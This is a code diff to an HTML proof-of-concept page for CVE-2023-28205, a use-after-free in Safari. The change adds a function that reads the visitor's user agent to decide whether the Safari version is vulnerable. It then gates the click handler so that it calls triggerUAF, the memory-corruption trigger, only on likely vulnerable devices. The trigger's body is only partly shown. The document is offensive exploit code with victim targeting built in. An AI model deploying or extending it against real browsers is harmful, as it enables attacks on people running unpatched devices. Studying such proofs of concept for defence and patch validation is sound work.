@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>CVE-2023-28205 PoC Crash</title>
+  <title>CVE-2023-28205 Safari Crash PoC</title>
   <style>
     body {
       background: #121212;
@@ -70,6 +70,25 @@
       console.log(message);
     }
 
+    function checkVulnerability() {
+      const ua = navigator.userAgent;
+      const versionMatch = ua.match(/Version\/(\d+)\.(\d+)/);
+      if (!versionMatch) {
+        log("Unable to detect Safari version.");
+        return false;
+      }
+      const major = parseInt(versionMatch[1], 10);
+      const minor = parseInt(versionMatch[2], 10);
+      // Vulnerable versions: iOS Safari 16.4.1 and below roughly correspond to Version 16.4 and below
+      if (major < 16) {
+        return true;
+      }
+      if (major === 16 && minor <= 4) {
+        return true;
+      }
+      return false;
+    }
+
     function triggerUAF() {
       log("Starting exploit... Creating Map and Date objects.");
       for (let i = 0; i < 10000; i++) {
@@ -103,7 +122,12 @@
 
     document.getElementById('start').addEventListener('click', () => {
       log("Button clicked.");
-      triggerUAF();
+      if (checkVulnerability()) {
+        log("Device/Safari version is likely vulnerable.");
+        triggerUAF();
+      } else {
+        log("Warning: This device or Safari version is likely NOT vulnerable.");
+      }
     });
   </script>
 </body>
